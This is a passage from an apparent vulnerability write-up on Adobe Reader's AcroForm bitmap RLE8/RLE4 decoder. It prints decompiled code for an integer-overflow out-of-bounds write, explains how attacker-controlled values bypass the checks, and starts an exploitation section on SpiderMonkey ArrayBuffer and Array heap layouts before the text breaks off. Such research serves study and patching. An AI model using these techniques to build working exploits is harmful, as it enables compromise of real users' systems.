fn_feof(v1[<span class="number">2</span>]);</span><br><span class="line">  <span class="keyword">if</span> ( !result )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( bitmap_ends )</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">      fn_read_bytes(v1[<span class="number">2</span>], &amp;cmd, <span class="number">2u</span>);           <span class="comment">// read 2 bytes</span></span><br><span class="line">      <span class="keyword">if</span> ( (_BYTE)cmd )                         <span class="comment">// first byte != 0</span></span><br><span class="line">      &#123;                                         <span class="comment">// means have compressed data</span></span><br><span class="line">        <span class="comment">// 20CF440F, this basic block was patched in the updated binary file</span></span><br><span class="line">        <span class="keyword">if</span> ( ypos &gt;= height || (<span class="keyword">unsigned</span> __int8)cmd + xpos &gt; width )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_170;                       <span class="comment">// CxxThrowException</span></span><br><span class="line">        index = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> ( (_BYTE)cmd )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">do</span></span><br><span class="line">          &#123;</span><br><span class="line">            line = (_BYTE *)fn_get_scanline(v1[<span class="number">3</span>], ypos);</span><br><span class="line">            line[xpos++] = BYTE1(cmd);</span><br><span class="line">            ++index;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">while</span> ( index &lt; (<span class="keyword">unsigned</span> __int8)cmd ); <span class="comment">// uncompress data</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( BYTE1(cmd) )        <span class="comment">// first byte = 0, second byte != 0</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( BYTE1(cmd) == <span class="number">1</span> )      <span class="comment">// end of bitmap</span></span><br><span class="line">        &#123;</span><br><span class="line">          bitmap_ends = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( BYTE1(cmd) == <span class="number">2</span> ) <span class="comment">// delta</span></span><br><span class="line">        &#123;</span><br><span class="line">          fn_read_bytes(v1[<span class="number">2</span>], &amp;xdelta, <span class="number">1u</span>);</span><br><span class="line">          fn_read_bytes(v1[<span class="number">2</span>], &amp;ydelta, <span class="number">1u</span>);</span><br><span class="line">          xpos += xdelta;           <span class="comment">// move to right</span></span><br><span class="line">          ypos -= ydelta;           <span class="comment">// move to up</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>                        <span class="comment">// uncompressed data</span></span><br><span class="line">        &#123;</span><br><span class="line">          dst_xpos = BYTE1(cmd) + xpos;</span><br><span class="line">          <span class="keyword">if</span> ( ypos &gt;= height || dst_xpos &lt; xpos || </span><br><span class="line">               dst_xpos &lt; BYTE1(cmd) || dst_xpos &gt; width )  <span class="comment">// overflow check</span></span><br><span class="line">            <span class="keyword">goto</span> LABEL_170;         <span class="comment">// CxxThrowException</span></span><br><span class="line">          index = <span class="number">0</span>;</span><br><span class="line">          <span class="keyword">if</span> ( BYTE1(cmd) )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">do</span></span><br><span class="line">            &#123;</span><br><span class="line">              fn_read_bytes(v1[<span class="number">2</span>], &amp;value, <span class="number">1u</span>);</span><br><span class="line">              line = (_BYTE *)fn_get_scanline(v1[<span class="number">3</span>], ypos);</span><br><span class="line">              line[xpos++] = value;</span><br><span class="line">              count = BYTE1(cmd);</span><br><span class="line">              ++index;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span> ( index &lt; BYTE1(cmd) );   <span class="comment">// uncompressed data</span></span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">if</span> ( count &amp; <span class="number">1</span> )                  <span class="comment">// alignment</span></span><br><span class="line">            fn_read_bytes(v1[<span class="number">2</span>], &amp;value, <span class="number">1u</span>);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span>                                  <span class="comment">// end of line</span></span><br><span class="line">      &#123;</span><br><span class="line">        --ypos;                             <span class="comment">// move to next line</span></span><br><span class="line">        xpos = <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      result = fn_feof(v1[<span class="number">2</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( !result );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Based on previous patch analysis, it’s obvious that integer overflow can be triggered in the following <code>if</code> statement.</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 20CF440F, this basic block was patched in the updated binary file</span></span><br><span class="line"><span class="keyword">if</span> ( ypos &gt;= height || (<span class="keyword">unsigned</span> __int8)cmd + xpos &gt; width )</span><br><span class="line">  <span class="keyword">goto</span> LABEL_170;                       <span class="comment">// CxxThrowException</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 20CF501F in AcroForm 2019.012.20036</span></span><br><span class="line">dst_xpos = (<span class="keyword">unsigned</span> __int8)cmd + xpos;</span><br><span class="line"><span class="keyword">if</span> ( ypos &gt;= height || dst_xpos &gt; width || </span><br><span class="line">     dst_xpos &lt; xpos || dst_xpos &lt; (<span class="keyword">unsigned</span> __int8)cmd )</span><br><span class="line">  <span class="keyword">goto</span> LABEL_176;</span><br></pre></td></tr></table></figure><p>The flaw exists within the arithmetic computation of <code>(unsigned __int8)cmd + xpos</code> . Here the value of both variables can be controlled by the attacker. And Out-Of-Bounds write can be triggered when decompressing RLE8 compressed data.</p><ol><li>The value of <code>(unsigned __int8)cmd</code> can be controlled directly in the bitmap file</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fn_read_bytes(v1[<span class="number">2</span>], &amp;cmd, <span class="number">2u</span>);           <span class="comment">// read 2 bytes</span></span><br></pre></td></tr></table></figure><ol start="2"><li>The value of <code>xpos</code> can be controlled by arranging lots of <code>delta</code> commands in <strong>encoded mode</strong></li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( BYTE1(cmd) == <span class="number">2</span> ) <span class="comment">// delta</span></span><br><span class="line">&#123;</span><br><span class="line">  fn_read_bytes(v1[<span class="number">2</span>], &amp;xdelta, <span class="number">1u</span>);</span><br><span class="line">  fn_read_bytes(v1[<span class="number">2</span>], &amp;ydelta, <span class="number">1u</span>);</span><br><span class="line">  xpos += xdelta;           <span class="comment">// move to right, add any value in [0, 255]</span></span><br><span class="line">  ypos -= ydelta;           <span class="comment">// move to up</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="3"><li>Out-Of-Bounds write can be triggered when decompressing RLE8 compressed data</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">index = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">  line = (_BYTE *)fn_get_scanline(v1[<span class="number">3</span>], ypos);</span><br><span class="line">  line[xpos++] = BYTE1(cmd);            <span class="comment">// OOB write with constrolled data</span></span><br><span class="line">  ++index;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> ( index &lt; (<span class="keyword">unsigned</span> __int8)cmd ); <span class="comment">// uncompress data</span></span><br></pre></td></tr></table></figure><h4 id="4-2-2-RLE4-Decoding"><a href="#4-2-2-RLE4-Decoding" class="headerlink" title="4.2.2 RLE4 Decoding"></a>4.2.2 RLE4 Decoding</h4><p>Following pseudo code, which was also extracted from function <code>sub_20CF3E5F</code> , was responsible for parsing the RLE4 compressed data. The decoding process was almost the same, but it’s a little more complicated than RLE8 since the data unit was not a byte.</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( bmih.biCompression == <span class="number">2</span> )  <span class="comment">// RLE4 algorithm</span></span><br><span class="line">&#123;</span><br><span class="line">  xpos = <span class="number">0</span>;                     <span class="comment">// unsigned int, from left to right</span></span><br><span class="line">  ypos = bmih.biHeight - <span class="number">1</span>;     <span class="comment">// unsigned int, from bottom to top</span></span><br><span class="line">  bitmap_ends = <span class="number">0</span>;</span><br><span class="line">  odd_index_ = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !fn_feof(v1[<span class="number">2</span>]) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( bitmap_ends )</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">      fn_read_bytes(v1[<span class="number">2</span>], &amp;cmd, <span class="number">2u</span>);       <span class="comment">// read 2 bytes</span></span><br><span class="line">      <span class="keyword">if</span> ( (_BYTE)cmd )                     <span class="comment">// first byte != 0</span></span><br><span class="line">      &#123;                                     <span class="comment">// means have compressed data</span></span><br><span class="line">        high_4bits = BYTE1(cmd) &gt;&gt; <span class="number">4</span>;       <span class="comment">// high-order 4 bits</span></span><br><span class="line">        low_4bits = BYTE1(cmd) &amp; <span class="number">0xF</span>;       <span class="comment">// low-order 4 bits</span></span><br><span class="line">        <span class="comment">// 20CF45F8, this basic block was patched in the updated binary file</span></span><br><span class="line">        <span class="keyword">if</span> ( ypos &gt;= height || (<span class="keyword">unsigned</span> __int8)cmd + xpos &gt; width )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_170;                   <span class="comment">// CxxThrowException</span></span><br><span class="line">        index = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> ( (_BYTE)cmd )</span><br><span class="line">        &#123;</span><br><span class="line">          xpos_ = odd_index_;</span><br><span class="line">          <span class="keyword">do</span></span><br><span class="line">          &#123;</span><br><span class="line">            byte_slot = xpos_ &gt;&gt; <span class="number">1</span>;</span><br><span class="line">            odd_index = index &amp; <span class="number">1</span>;</span><br><span class="line">            line = fn_get_scanline(v1[<span class="number">3</span>], ypos);</span><br><span class="line">            _4bits = high_4bits;            <span class="comment">// even index -&gt; high-order 4 bits</span></span><br><span class="line">            <span class="keyword">if</span> ( odd_index )                <span class="comment">// odd index -&gt; low-order 4 bits</span></span><br><span class="line">              _4bits = low_4bits;</span><br><span class="line">            <span class="keyword">if</span> ( xpos_ &amp; <span class="number">1</span> )                <span class="comment">// odd xpos, old byte</span></span><br><span class="line">            &#123;</span><br><span class="line">              line[byte_slot] |= _4bits;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>                            <span class="comment">// even xpos, new byte</span></span><br><span class="line">            &#123;</span><br><span class="line">              line[byte_slot] = <span class="number">16</span> * _4bits;</span><br><span class="line">            &#125;</span><br><span class="line">            ++xpos_;</span><br><span class="line">            index = index + <span class="number">1</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">while</span> ( index &lt; (<span class="keyword">unsigned</span> __int8)cmd );</span><br><span class="line">          odd_index_ = xpos_;</span><br><span class="line">          xpos = odd_index_;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( BYTE1(cmd) )                <span class="comment">// first byte = 0, second byte != 0</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( BYTE1(cmd) == <span class="number">1</span> )              <span class="comment">// end of bitmap</span></span><br><span class="line">        &#123;</span><br><span class="line">          bitmap_ends = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( BYTE1(cmd) == <span class="number">2</span> )         <span class="comment">// delta</span></span><br><span class="line">        &#123;</span><br><span class="line">          fn_read_bytes((_DWORD *)v1[<span class="number">2</span>], &amp;xdelta, <span class="number">1u</span>);</span><br><span class="line">          fn_read_bytes((_DWORD *)v1[<span class="number">2</span>], &amp;ydelta, <span class="number">1u</span>);</span><br><span class="line">          xpos += xdelta;                   <span class="comment">// move to right</span></span><br><span class="line">          ypos -= ydelta;                   <span class="comment">// move to up</span></span><br><span class="line">          odd_index_ = xpos;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="comment">// 20CF44EA, this basic block was patched in the updated binary file</span></span><br><span class="line">          <span class="keyword">if</span> ( ypos &gt;= height || BYTE1(cmd) + xpos &gt; width )</span><br><span class="line">            <span class="keyword">goto</span> LABEL_170;                 <span class="comment">// CxxThrowException</span></span><br><span class="line">          index = <span class="number">0</span>;</span><br><span class="line">          odd_index = <span class="number">0</span>;</span><br><span class="line">          <span class="keyword">if</span> ( BYTE1(cmd) )                 <span class="comment">// uncompressed data</span></span><br><span class="line">          &#123;</span><br><span class="line">            xpos_ = odd_index_;</span><br><span class="line">            <span class="keyword">do</span></span><br><span class="line">            &#123;</span><br><span class="line">              odd_index_ = index &amp; <span class="number">1</span>;</span><br><span class="line">              <span class="keyword">if</span> ( !(index &amp; <span class="number">1</span>) )           <span class="comment">// read 1 byte data</span></span><br><span class="line">              &#123;</span><br><span class="line">                fn_read_bytes((_DWORD *)v1[<span class="number">2</span>], &amp;value, <span class="number">1u</span>);</span><br><span class="line">                low_4bits_ = value &amp; <span class="number">0xF</span>;   <span class="comment">// low-order 4 bits</span></span><br><span class="line">                high_4bits_ = value &gt;&gt; <span class="number">4</span>;   <span class="comment">// high-order 4 bits</span></span><br><span class="line">              &#125;</span><br><span class="line">              byte_slot = xpos_ &gt;&gt; <span class="number">1</span>;</span><br><span class="line">              line = fn_get_scanline(v1[<span class="number">3</span>], ypos);</span><br><span class="line">              _4bits = high_4bits_;</span><br><span class="line">              <span class="keyword">if</span> ( odd_index_ )</span><br><span class="line">                _4bits = low_4bits_;</span><br><span class="line">              <span class="keyword">if</span> ( xpos_ &amp; <span class="number">1</span> )</span><br><span class="line">              &#123;</span><br><span class="line">                line[byte_slot] |= _4bits;</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">              &#123;</span><br><span class="line">                line[byte_slot] = <span class="number">16</span> * _4bits;</span><br><span class="line">              &#125;</span><br><span class="line">              ++xpos_;</span><br><span class="line">              count = BYTE1(cmd);</span><br><span class="line">              not_ended = odd_index++ + <span class="number">1</span> &lt; BYTE1(cmd);</span><br><span class="line">              index = odd_index;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span> ( not_ended );</span><br><span class="line">            odd_index_ = xpos_;</span><br><span class="line">            xpos = odd_index_;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">if</span> ( (count &amp; <span class="number">3u</span>) - <span class="number">1</span> &lt;= <span class="number">1</span> )      <span class="comment">// alignment</span></span><br><span class="line">            fn_read_bytes(v1[<span class="number">2</span>], &amp;value, <span class="number">1u</span>);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span>                                  <span class="comment">// end of line</span></span><br><span class="line">      &#123;</span><br><span class="line">        --ypos;                             <span class="comment">// move to next line</span></span><br><span class="line">        xpos = <span class="number">0</span>;</span><br><span class="line">        odd_index_ = <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      result = fn_feof((_DWORD *)v1[<span class="number">2</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( !result );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Integer overflow can be triggered in two spots, one exists within the handling of compressed data:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">high_4bits = BYTE1(cmd) &gt;&gt; <span class="number">4</span>;       <span class="comment">// high-order 4 bits</span></span><br><span class="line">low_4bits = BYTE1(cmd) &amp; <span class="number">0xF</span>;       <span class="comment">// low-order 4 bits</span></span><br><span class="line"><span class="comment">// 20CF45F8, this basic block was patched in the updated binary file</span></span><br><span class="line"><span class="keyword">if</span> ( ypos &gt;= height || (<span class="keyword">unsigned</span> __int8)cmd + xpos &gt; width )</span><br><span class="line">  <span class="keyword">goto</span> LABEL_170;                   <span class="comment">// CxxThrowException</span></span><br></pre></td></tr></table></figure><p>Another one exists within the handling of uncompressed data:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 20CF44EA, this basic block was patched in the updated binary file</span></span><br><span class="line"><span class="keyword">if</span> ( ypos &gt;= height || BYTE1(cmd) + xpos &gt; width )</span><br><span class="line">  <span class="keyword">goto</span> LABEL_170;                 <span class="comment">// CxxThrowException</span></span><br></pre></td></tr></table></figure><h2 id="0x05-Exploit"><a href="#0x05-Exploit" class="headerlink" title="0x05. Exploit"></a>0x05. Exploit</h2><h3 id="5-1-Overflow-Candidate"><a href="#5-1-Overflow-Candidate" class="headerlink" title="5.1 Overflow Candidate"></a>5.1 Overflow Candidate</h3><p>Three integer overflows were found within the function. Here we’ll choose the one within the handling of RLE8 data. It’s more exploit friendly than the others.</p><p>In terms of RLE4 data decoding, the value of <code>xpos</code> will be divided by <code>2</code> when putting data into the scan line. The maximum offset value for the scan line is <code>0xFFFFFFFF / 2 = 0x7FFFFFFF</code> , it means that we can only <strong>write forward</strong> and the address we are trying to write is probably out of our control.</p><p>For RLE8 data decoding, the offset value for the scan line is <code>xpos</code> itself, thus we can <strong>write backward</strong> and the distance can be controlled. In the following <code>if</code> statement, the maximum value of <code>(unsigned __int8)cmd</code> is <code>0xFF</code> . And to bypass the check, the minimum value of <code>xpos</code> is <code>0xFFFFFF01</code> which should be <code>-255</code> in <code>signed int</code> form. In other words, we can write backward as large as <code>0xFF</code> bytes.</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 20CF440F, this basic block was patched in the updated binary file</span></span><br><span class="line"><span class="keyword">if</span> ( ypos &gt;= height || (<span class="keyword">unsigned</span> __int8)cmd + xpos &gt; width )</span><br><span class="line">  <span class="keyword">goto</span> LABEL_170;                       <span class="comment">// CxxThrowException</span></span><br></pre></td></tr></table></figure><p>However, the interval we’re trying to write can only be filled with the same value. This will cause some problems when writing exploit, it will be explained later.</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">index = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">  line = (_BYTE *)fn_get_scanline(v1[<span class="number">3</span>], ypos);</span><br><span class="line">  line[xpos++] = BYTE1(cmd);</span><br><span class="line">  ++index;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> ( index &lt; (<span class="keyword">unsigned</span> __int8)cmd );</span><br></pre></td></tr></table></figure><h3 id="5-2-SpiderMonkey-Concepts"><a href="#5-2-SpiderMonkey-Concepts" class="headerlink" title="5.2 SpiderMonkey Concepts"></a>5.2 SpiderMonkey Concepts</h3><p>Adobe Reader uses <a href="https://developer.mozilla.org/en-US/docs/Mozilla/Projects/SpiderMonkey" target="_blank" rel="noopener">SpiderMonkey</a> as its JavaScript engine. Before writing the exploit, let’s learn some essential knowledge of the SpiderMonkey engine.</p><h4 id="5-2-1-ArrayBuffer"><a href="#5-2-1-ArrayBuffer" class="headerlink" title="5.2.1 ArrayBuffer"></a>5.2.1 ArrayBuffer</h4><p>When the value of <code>byteLength</code> is greater than <code>0x68</code> , the backing store of the <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/ArrayBuffer" target="_blank" rel="noopener">ArrayBuffer</a> object will be allocated from system heap (through <code>ucrtbase!calloc</code>), otherwise it will be allocated from SpiderMonkey’s <strong>tenured heap</strong> . Also, when allocating from system heap, the underlying heap buffer will be <code>0x10</code> bytes larger to store the <code>ObjectElements</code> object.</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ObjectElements</span> &#123;</span></span><br><span class="line"> <span class="keyword">public</span>:</span><br><span class="line">  <span class="keyword">uint32_t</span> flags;               <span class="comment">// can be any value, default is 0</span></span><br><span class="line">  <span class="keyword">uint32_t</span> initializedLength;   <span class="comment">// byteLength</span></span><br><span class="line">  <span class="keyword">uint32_t</span> capacity;            <span class="comment">// pointer of associated view object</span></span><br><span class="line">  <span class="keyword">uint32_t</span> length;              <span class="comment">// can be any value, default is 0</span></span><br><span class="line"> <span class="comment">// ......</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>The names of the members in <code>ObjectElements</code> are meaningless for <code>ArrayBuffer</code> . Here the second member holds the <code>byteLength</code> value and the third member holds a pointer of the associated <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/DataView" target="_blank" rel="noopener">DataView</a> object. The values of the other members are meaningless and can be any digits.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> ab = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x70</span>);</span><br><span class="line"><span class="keyword">var</span> dv = <span class="keyword">new</span> <span class="built_in">DataView</span>(ab);</span><br><span class="line">dv.setUint32(<span class="number">0</span>, <span class="number">0x41424344</span>, <span class="literal">true</span>);</span><br></pre></td></tr></table></figure><p>When executing the above JavaScript code in Adobe Reader, the backing store of the <code>ArrayBuffer</code> object will be looked like this:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">;            -, byteLength, viewobj,       -,</span><br><span class="line">34d54f80  00000000 00000070 2458f608 00000000</span><br><span class="line">;         data</span><br><span class="line">34d54f90  41424344 00000000 00000000 00000000</span><br><span class="line">34d54fa0  00000000 00000000 00000000 00000000</span><br><span class="line">34d54fb0  00000000 00000000 00000000 00000000</span><br><span class="line">34d54fc0  00000000 00000000 00000000 00000000</span><br><span class="line">34d54fd0  00000000 00000000 00000000 00000000</span><br><span class="line">34d54fe0  00000000 00000000 00000000 00000000</span><br><span class="line">34d54ff0  00000000 00000000 00000000 00000000</span><br></pre></td></tr></table></figure><p>If we can change the value of the <code>byteLength</code> of <code>ArrayBuffer</code> , then we can achieve Out-Of-Bounds access. But be careful with the pointer of the associated <code>DataView</code> object, it can only be 0 or a valid <code>DataView</code> pointer, the process may crash immediately if we change it to some other values.</p><h4 id="5-2-2-Array"><a href="#5-2-2-Array" class="headerlink" title="5.2.2 Array"></a>5.2.2 Array</h4><p>When the value of <code>length</code> is greater than <code>14</code> , the <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array" target="_blank" rel="noopener">Array</a> object can be allocated from system heap (through <code>ucrtbase!calloc</code>), otherwise it may be allocated from SpiderMonkey’s <strong>nursery heap</strong> . Also, when allocating from system heap, the underlying heap buffer will be <code>0x10</code> bytes larger to store the <code>ObjectElements</code> object.</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ObjectElements</span> &#123;</span></span><br><span class="line"> <span class="keyword">public</span>:</span><br><span class="line">  <span class="comment">// The NumShiftedElementsBits high bits of this are used to store the</span></span><br><span class="line">  <span class="comment">// number of shifted elements, the other bits are available for the flags.</span></span><br><span class="line">  <span class="comment">// See Flags enum above.</span></span><br><span class="line">  <span class="keyword">uint32_t</span> flags;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">   * Number of initialized elements. This is &lt;= the capacity, and for arrays</span></span><br><span class="line"><span class="comment">   * is &lt;= the length. Memory for elements above the initialized length is</span></span><br><span class="line"><span class="comment">   * uninitialized, but values between the initialized length and the proper</span></span><br><span class="line"><span class="comment">   * length are conceptually holes.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">uint32_t</span> initializedLength;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Number of allocated slots. */</span></span><br><span class="line">  <span class="keyword">uint32_t</span> capacity;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 'length' property of array objects, unused for other objects. */</span></span><br><span class="line">  <span class="keyword">uint32_t</span> length;</span><br><span class="line"> <span class="comment">// ......</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> array = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">15</span>);</span><br><span class="line">array[<span class="number">0</span>] = array[array.length - <span class="number">1</span>] = <span class="number">0x41424344</span>;</span><br></pre></td></tr></table></figure><p>When executing the above JavaScript code in Adobe Reader, the underlying storage buffer of the <code>Array</code> object will be looked like this:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">0:010&gt; dd 34cb0f88-10 